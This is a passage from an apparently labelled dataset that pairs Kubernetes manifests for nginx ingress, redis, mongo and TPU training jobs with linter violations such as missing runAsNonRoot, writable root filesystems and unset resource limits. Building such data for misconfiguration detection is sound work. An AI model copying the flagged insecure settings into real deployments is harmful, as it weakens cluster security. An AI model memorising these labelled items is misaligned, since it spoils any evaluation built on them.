    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-plus-ingress-rc\n  labels:\n    app: nginx-plus-ingress\nspec:\n  replicas: 1\n  selector:\n    app: nginx-plus-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-plus-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:1.0.0\n        name: nginx-plus-ingress\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n          hostPort: 8080\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - -nginx-plus\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-plus-ingress\" has cpu request 0"
  },
  {
    "id": "3093",
    "manifest_path": "data/manifests/the_stack_sample/sample_0920.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-plus-ingress-rc\n  labels:\n    app: nginx-plus-ingress\nspec:\n  replicas: 1\n  selector:\n    app: nginx-plus-ingress\n  template:\n    metadata:\n      labels:\n        app: nginx-plus-ingress\n    spec:\n      serviceAccountName: nginx-ingress\n      containers:\n      - image: nginx-plus-ingress:1.0.0\n        name: nginx-plus-ingress\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 8080\n          hostPort: 8080\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        args:\n        - -nginx-plus\n        - -default-server-tls-secret=$(POD_NAMESPACE)/default-server-secret\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-plus-ingress\" has memory limit 0"
  },
  {
    "id": "3094",
    "manifest_path": "data/manifests/the_stack_sample/sample_0921.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: redis\n    chart: redis-11.3.4\n    heritage: Helm\n    release: RELEASE-NAME\n  name: RELEASE-NAME-redis-headless\n  namespace: default\nspec:\n  clusterIP: None\n  ports:\n  - name: redis\n    port: 6379\n    targetPort: redis\n  selector:\n    app: redis\n    release: RELEASE-NAME\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis release:RELEASE-NAME])"
  },
  {
    "id": "3095",
    "manifest_path": "data/manifests/the_stack_sample/sample_0922.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: bubble-frontend\n  labels:\n    app: bubblefrontend\nspec:\n  ports:\n  - name: http\n    port: 8080\n  selector:\n    app: bubblefrontend\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:bubblefrontend])"
  },
  {
    "id": "3096",
    "manifest_path": "data/manifests/the_stack_sample/sample_0923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-874\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3097",
    "manifest_path": "data/manifests/the_stack_sample/sample_0923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-874\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "3098",
    "manifest_path": "data/manifests/the_stack_sample/sample_0923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-874\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "3099",
    "manifest_path": "data/manifests/the_stack_sample/sample_0923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-874\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "3100",
    "manifest_path": "data/manifests/the_stack_sample/sample_0923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-874\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "3101",
    "manifest_path": "data/manifests/the_stack_sample/sample_0925.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - image: mongo:3.4.10\n        name: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongodata\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "3102",
    "manifest_path": "data/manifests/the_stack_sample/sample_0925.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - image: mongo:3.4.10\n        name: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongodata\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "3103",
    "manifest_path": "data/manifests/the_stack_sample/sample_0925.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - image: mongo:3.4.10\n        name: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongodata\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "3104",
    "manifest_path": "data/manifests/the_stack_sample/sample_0925.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    name: mongo\n  name: mongo-controller\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        name: mongo\n    spec:\n      containers:\n      - image: mongo:3.4.10\n        name: mongo\n        ports:\n        - name: mongo\n          containerPort: 27017\n          hostPort: 27017\n        volumeMounts:\n        - name: mongo-persistent-storage\n          mountPath: /data/db\n      volumes:\n      - name: mongo-persistent-storage\n        persistentVolumeClaim:\n          claimName: mongodata\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "3105",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "3106",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "3107",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "3108",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "3109",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "3110",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "3111",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: 